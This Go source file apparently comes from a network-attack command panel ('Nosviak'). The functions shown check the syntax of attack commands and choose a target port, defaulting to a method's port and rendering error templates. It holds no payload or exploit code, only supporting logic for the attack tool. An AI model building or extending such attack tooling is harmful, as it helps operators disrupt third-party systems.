package attacks

import (
	Toml "Nosviak/core/models/configs/toml"
	"Nosviak/core/models/views"
	"errors"
	"strconv"
	"strings"
)

//checks that the syntax provided is valid
//this makes sure the syntax which was provied is valid
func (attack *Attack) CheckSyntax() error {
	//validates the length of the command seq
	//makes sure the length is valid
	if len(attack.Command) <= 2 {
		//renders the invalid arguments error
		if err := views.NewDTX("attacks-missing-Arguments.dtx", attack.session.Write).RegisterVariable("method", attack.Command[0]).RegisterVariable("syntax", strings.Join(attack.Command, " ")).Template(attack.session, attack.session.Channel); err != nil {
			//handles the error which happened
			return err
		}
		//returns a error which will make sure the attack doesn't continue
		return errors.New("invalid syntax detected for an attack")
	}
	//as the command is allowed to pass correctly
	return nil
}

//gets the valid port for the attack
//this will check if there was a port inputed for the attack
//if there wasn't we will use the default port information
// TODO: write support for custom port keywords, like "ssh" would resolve back to port 22 etc
func (attack *Attack) ValidatePort() (int, error) {

	//checks if the length matches with a valid default port
	//this will check if there is a default port needed
	if len(attack.Command) <= 3 || len(attack.Command) <= 4 && strings.Split(attack.Command[3], "")[0] == strings.Split(Toml.AttacksToml.Attacks.KvPointer, "")[0] {
		//returns the default port which was selected properly, we will also render the default port selected information
		return attack.MethodUsed.DefaultPort, views.NewDTX("attacks-defaultPort.dtx", attack.session.Write).RegisterVariable("defaultPort", strconv.Itoa(attack.MethodUsed.DefaultPort)).Template(attack.session, attack.session.Channel)
	}

	//resolves the port selected into a integer
	//this will make sure the instance knows what the default port is
	convert, err := strconv.Atoi(attack.Command[3])

	//err handles the conversation statement
	//we will also check if the port is within certain boundaries
	if err != nil || convert <= 0 || convert >= 65535 {

		//this will trigger if the port isn't a integer
		//this will render an invalid port menu
		if err != nil {
			//renders the invalid type port information
			return 0, views.NewDTX("attacks-invalidTypePort.dtx", attack.session.Write).RegisterVariable("port", attack.Command[3]).Template(attack.session, attack.session.Channel)
		}

		//renders the invalid size port information
		//this will display when the port isn't valid as in number state
		return 0, views.NewDTX("attacks-invalidSizePort.dtx", attack.session.Write).RegisterVariable("port", attack.Command[3]).Template(attack.session, attack.session.Channel)
	}

	//returns the port which was selected inside the command
	return convert, nil
}